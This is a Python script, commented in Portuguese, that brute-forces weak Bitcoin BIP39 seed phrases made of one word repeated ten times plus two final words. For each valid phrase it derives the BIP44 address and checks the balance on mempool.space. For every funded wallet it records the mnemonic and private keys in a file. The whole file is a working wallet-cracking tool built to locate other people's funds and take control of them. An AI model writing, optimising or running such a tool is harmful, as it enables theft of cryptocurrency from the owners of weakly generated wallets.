#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
realfindbitcoin.py (CPU-ONLY otimizado)
Mantém 100% da lógica: padrão 10 repetidas + 2 variáveis, valida BIP39,
deriva BIP44, verifica saldo na mempool.space e salva carteiras com saldo.
Otimizações: ProcessPoolExecutor (multiprocess), reuso de validator,
requests.Session pooling, redução de I/O (salva ultimo.txt com frequência configurável),
salvamentos atômicos e safe shutdown (Ctrl+C).
"""

import os
import time
import signal
from time import perf_counter
from concurrent.futures import ProcessPoolExecutor
from typing import Optional, Tuple

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# bip-utils imports (usados no main e no worker)
from bip_utils import Bip39SeedGenerator, Bip39MnemonicValidator, Bip44, Bip44Coins, Bip44Changes

# -------- CONFIGURAÇÃO (ajuste conforme preferir) ----------
BIP39_WORDS_FILE = "bip39-words.txt"
CHECKPOINT_FILE = "checkpoint.txt"
ULTIMO_FILE = "ultimo.txt"
SALDO_FILE = "saldo.txt"
ESTATISTICAS_FILE = "estatisticas_finais.txt"

FREQUENCY_PRINT = 100        # print a cada N combinações
FREQUENCY_SAVE = 100         # salvar checkpoint a cada N combinações
SAVE_INTERVAL_SEC = 15       # ou salvar checkpoint a cada X segundos
SAVE_ULTIMO_EVERY = 100      # salva ultimo.txt a cada N combinações (evita I/O a cada iteração)
SAVE_ULTIMO_INTERVAL = 5.0   # ou salva ultimo após este tempo (s)

USE_PROCESS_POOL = True
CPU_WORKERS = max(1, (os.cpu_count() or 2) - 1)  # default: núcleos - 1
# MELHORIA APLICADA: Permite forçar o número de workers via variável de ambiente (RF_CPU_WORKERS)
CPU_WORKERS = int(os.getenv('RF_CPU_WORKERS', str(CPU_WORKERS))) 
REQUESTS_TIMEOUT = 8

# -------- HTTP session global (pooling) ---------------------
SESSION = requests.Session()
retries = Retry(total=3, backoff_factor=0.25, status_forcelist=(500,502,503,504))
adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=retries)
SESSION.mount("https://", adapter)
SESSION.mount("http://", adapter)

# -------- I/O helpers atômicos ------------------------------
def atomic_write(path: str, content: str, encoding='utf-8'):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding=encoding) as f:
        f.write(content)
        f.flush()
        try:
            os.fsync(f.fileno())
        except Exception:
            pass
    os.replace(tmp, path)

def append_and_sync(path: str, text: str, encoding='utf-8'):
    with open(path, "a", encoding=encoding) as f:
        f.write(text)
        f.flush()
        try:
            os.fsync(f.fileno())
        except Exception:
            pass

# -------- Carregamento / checkpoint -------------------------
def carregar_palavras_bip39(arquivo=BIP39_WORDS_FILE):
    if not os.path.exists(arquivo):
        raise FileNotFoundError(f"Arquivo {arquivo} não encontrado!")
    with open(arquivo, "r", encoding="utf-8") as f:
        palavras = [l.strip() for l in f.readlines() if l.strip()]
    if len(palavras) != 2048:
        print(f"Aviso: Esperadas 2048 palavras, encontradas {len(palavras)}")
    return palavras

def carregar_ultima_combinacao(arquivo=ULTIMO_FILE) -> Tuple[Optional[str], Optional[str], Optional[str], Optional[str]]:
    if not os.path.exists(arquivo):
        return None, None, None, None
    try:
        with open(arquivo, "r", encoding="utf-8") as f:
            palavras = f.read().strip().split()
            if len(palavras) == 12:
                palavra_base = palavras[0]
                if all(p == palavra_base for p in palavras[:10]):
                    return palavra_base, palavras[10], palavras[11], " ".join(palavras)
    except Exception:
        pass
    return None, None, None, None

def carregar_estatisticas_checkpoint(arquivo=CHECKPOINT_FILE):
    contador_total = contador_validas = carteiras_com_saldo = 0
    if not os.path.exists(arquivo):
        salvar_checkpoint(arquivo, 0, "", 0, 0, 0)
        return 0,0,0
    try:
        with open(arquivo, "r", encoding="utf-8") as f:
            for line in f:
                if "Total de combinações testadas:" in line:
                    try: contador_total = int(line.split(":")[1].strip())
                    except: contador_total = 0
                elif "Combinações válidas:" in line:
                    try: contador_validas = int(line.split(":")[1].strip())
                    except: contador_validas = 0
                elif "Carteiras com saldo:" in line:
                    try: carteiras_com_saldo = int(line.split(":")[1].strip())
                    except: carteiras_com_saldo = 0
    except Exception as e:
        print(f"Erro ao ler checkpoint: {e}")
    return contador_total, contador_validas, carteiras_com_saldo

def encontrar_proxima_combinacao(palavras, ultima_base, ultima_completa1):
    try:
        base_idx = palavras.index(ultima_base)
        first_idx = palavras.index(ultima_completa1)
        if first_idx + 1 < len(palavras) - 1:
            return base_idx, first_idx + 1
        elif base_idx + 1 < len(palavras):
            return base_idx + 1, 0
        else:
            return None, None
    except ValueError:
        return 0, 0

def salvar_ultima_combinacao(arquivo=ULTIMO_FILE, palavra_base="", palavra_completa1="", palavra_completa2=""):
    palavras = [palavra_base] * 10 + [palavra_completa1, palavra_completa2]
    mnemonic = " ".join(palavras)
    atomic_write(arquivo, mnemonic)

def salvar_checkpoint(arquivo=CHECKPOINT_FILE, base_idx=0, palavra_base="", contador_total=0, contador_validas=0, carteiras_com_saldo=0):
    texto = (
        f"Última palavra base testada: {base_idx + 1} ({palavra_base})\n"
        f"Total de combinações testadas: {contador_total}\n"
        f"Combinações válidas: {contador_validas}\n"
        f"Carteiras com saldo: {carteiras_com_saldo}\n"
    )
    atomic_write(arquivo, texto)

def salvar_carteira_com_saldo(palavra_base, palavra_completa1, palavra_completa2, mnemonic, info):
    texto = (
        f"Palavra Base: {palavra_base} (repetida 10x)\n"
        f"Palavras Finais: {palavra_completa1}, {palavra_completa2}\n"
        f"Mnemonic: {mnemonic}\n"
        f"Endereço: {info['address']}\n"
        f"Chave Privada (WIF): {info['wif']}\n"
        f"Chave Privada (HEX): {info['priv_hex']}\n"
        f"Chave Pública: {info['pub_compressed_hex']}\n"
        + "-" * 80 + "\n\n"
    )
    append_and_sync(SALDO_FILE, texto)
    print("🎉 CARTEIRA COM SALDO SALVA! 🎉")

# -------- Worker pesado (executa em processo separado) ------
def worker_process_validation(args):
    mnemonic, palavra_base, palavra_completa1, palavra_completa2 = args
    try:
        from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
        import requests

        seed_gen = Bip39SeedGenerator(mnemonic)
        seed_bytes = seed_gen.Generate()

        bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
        acct = bip44_ctx.Purpose().Coin().Account(0)
        change = acct.Change(Bip44Changes.CHAIN_EXT)
        addr_index = change.AddressIndex(0)

        priv_key_obj = addr_index.PrivateKey()
        pub_key_obj = addr_index.PublicKey()
        info = {
            "priv_hex": priv_key_obj.Raw().ToHex(),
            "wif": priv_key_obj.ToWif(),
            "pub_compressed_hex": pub_key_obj.RawCompressed().ToHex(),
            "address": addr_index.PublicKey().ToAddress()
        }

        session = requests.Session()
        try:
            resp = session.get(f"https://mempool.space/api/address/{info['address']}", timeout=REQUESTS_TIMEOUT)
            if resp.status_code == 200:
                data = resp.json()
                saldo = data.get('chain_stats', {}).get('funded_txo_sum', 0)
                tem_saldo = saldo > 0
            else:
                tem_saldo = False
        except Exception:
            tem_saldo = False

        return {
            "mnemonic": mnemonic,
            "palavra_base": palavra_base,
            "palavra_completa1": palavra_completa1,
            "palavra_completa2": palavra_completa2,
            "tem_saldo": tem_saldo,
            "info": info if tem_saldo else None
        }
    except Exception as e:
        return {
            "mnemonic": mnemonic,
            "palavra_base": palavra_base,
            "palavra_completa1": palavra_completa1,
            "palavra_completa2": palavra_completa2,
            "tem_saldo": False,
            "info": None,
            "error": str(e)
        }

# -------- Signal handling para shutdown seguro -------------
_shutdown_requested = False
def _signal_handler(sig, frame):
    global _shutdown_requested
    _shutdown_requested = True
    print("\n🟡 Sinal de interrupção recebido — finalizando com segurança...")

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# -------- Função principal ----------------------------------
def main():
    global _shutdown_requested

    try:
        palavras = carregar_palavras_bip39(BIP39_WORDS_FILE)
        print(f"Carregadas {len(palavras)} palavras BIP39")
    except FileNotFoundError as e:
        print(e)
        return

    ultima_base, ultima_completa1, ultima_completa2, ultimo_mnemonic = carregar_ultima_combinacao(ULTIMO_FILE)
    contador_total, contador_validas, carteiras_com_saldo = carregar_estatisticas_checkpoint(CHECKPOINT_FILE)

    print("\nEstatísticas carregadas:")
    print(f"  Total testadas: {contador_total}")
    print(f"  Válidas: {contador_validas}")
    print(f"  Com saldo: {carteiras_com_saldo}\n")

    if ultima_base and ultima_completa1 and ultima_completa2:
        print(f"Última combinação testada: {ultimo_mnemonic}")
        base_idx, completa_idx = encontrar_proxima_combinacao(palavras, ultima_base, ultima_completa1)
        if base_idx is None:
            print("Todas as combinações já foram testadas!")
            return
    else:
        print("Nenhum checkpoint encontrado, começando do início...\n")
        base_idx, completa_idx = 0, 0

    print(f"Continuando de '{palavras[base_idx]}' (base), iniciando variação #{completa_idx+1}")
    print("\nIniciando geração de combinações 10+2 BIP39...\n")

    validator = Bip39MnemonicValidator()
    t0 = perf_counter()
    ultimo_salvamento_tempo = time.time()
    last_save_ultimo_time = time.time()
    combos_since_last = 0

    stats_validas = contador_validas
    stats_saldos = carteiras_com_saldo

    executor = ProcessPoolExecutor(max_workers=CPU_WORKERS) if USE_PROCESS_POOL else None
    pending_futures = []

    try:
        for i in range(base_idx, len(palavras)):
            if _shutdown_requested:
                break
            palavra_base = palavras[i]
            base_prefix = " ".join([palavra_base] * 10)
            start_j = completa_idx if i == base_idx else 0

            for j in range(start_j, len(palavras) - 1):
                if _shutdown_requested:
                    break

                palavra_completa1 = palavras[j]
                palavra_completa2 = palavras[j + 1]
                contador_total += 1

                mnemonic = f"{base_prefix} {palavra_completa1} {palavra_completa2}"

                combos_since_last += 1
                now = time.time()
                if combos_since_last >= SAVE_ULTIMO_EVERY or (now - last_save_ultimo_time) >= SAVE_ULTIMO_INTERVAL:
                    salvar_ultima_combinacao(ULTIMO_FILE, palavra_base, palavra_completa1, palavra_completa2)
                    combos_since_last = 0
                    last_save_ultimo_time = now

                if now - ultimo_salvamento_tempo > SAVE_INTERVAL_SEC or contador_total % FREQUENCY_SAVE == 0:
                    salvar_checkpoint(CHECKPOINT_FILE, i, palavra_base, contador_total, stats_validas, stats_saldos)
                    ultimo_salvamento_tempo = now

                if contador_total % FREQUENCY_PRINT == 0:
                    elapsed = perf_counter() - t0
                    rate = contador_total / elapsed if elapsed > 0 else 0.0
                    print(f"Testadas {contador_total} combinações | Última: {mnemonic}")
                    print(f"  Válidas (até agora): {stats_validas} | Com saldo: {stats_saldos} | {rate:.2f} combos/s")

                try:
                    is_valid = validator.IsValid(mnemonic)
                except Exception:
                    is_valid = False

                if is_valid:
                    if executor:
                        fut = executor.submit(worker_process_validation, (mnemonic, palavra_base, palavra_completa1, palavra_completa2))
                        pending_futures.append(fut)
                    else:
                        res = worker_process_validation((mnemonic, palavra_base, palavra_completa1, palavra_completa2))
                        if res.get("tem_saldo"):
                            stats_saldos += 1
                            salvar_carteira_com_saldo(res["palavra_base"], res["palavra_completa1"], res["palavra_completa2"], res["mnemonic"], res["info"])
                        stats_validas += 1

                if pending_futures and (len(pending_futures) >= 50 or contador_total % (FREQUENCY_PRINT*2) == 0):
                    done_now = []
                    for f in list(pending_futures):
                        if f.done():
                            try:
                                r = f.result(timeout=0)
                            except Exception:
                                r = {"tem_saldo": False}
                            if r.get("tem_saldo"):
                                stats_saldos += 1
                                salvar_carteira_com_saldo(r["palavra_base"], r["palavra_completa1"], r["palavra_completa2"], r["mnemonic"], r["info"])
                            if r.get("mnemonic"):
                                stats_validas += 1
                            done_now.append(f)
                    for f in done_now:
                        try:
                            pending_futures.remove(f)
                        except ValueError:
                            pass

            completa_idx = 0
            salvar_checkpoint(CHECKPOINT_FILE, i, palavra_base, contador_total, stats_validas, stats_saldos)
            print(f"\nConcluído para '{palavra_base}': {stats_validas} válidas, {stats_saldos} com saldo\n")

    except Exception as e:
        print(f"[main] Erro inesperado: {e}")

    finally:
        if executor:
            print("🟢 Aguardando finalização das tasks pendentes do pool...")
            for f in pending_futures:
                try:
                    r = f.result(timeout=30)
                    if r.get("tem_saldo"):
                        stats_saldos += 1
                        salvar_carteira_com_saldo(r["palavra_base"], r["palavra_completa1"], r["palavra_completa2"], r["mnemonic"], r["info"])
                    if r.get("mnemonic"):
                        stats_validas += 1
                except Exception:
                    pass
            executor.shutdown(wait=True)

        salvar_checkpoint(CHECKPOINT_FILE, i if 'i' in locals() else 0, palavra_base if 'palavra_base' in locals() else "", contador_total, stats_validas, stats_saldos)

        with open(ESTATISTICAS_FILE, "w", encoding='utf-8') as f:
            f.write("ESTATÍSTICAS FINAIS\n" + "="*50 + "\n")
            f.write(f"Total testadas: {contador_total}\n")
            f.write(f"Válidas: {stats_validas}\n")
            f.write(f"Com saldo: {stats_saldos}\n")

        print("\n✅ Execução finalizada. Estatísticas gravadas em", ESTATISTICAS_FILE)
        print(f"Total testadas: {contador_total} | Válidas: {stats_validas} | Com saldo: {stats_saldos}")

if __name__ == "__main__":
    main()
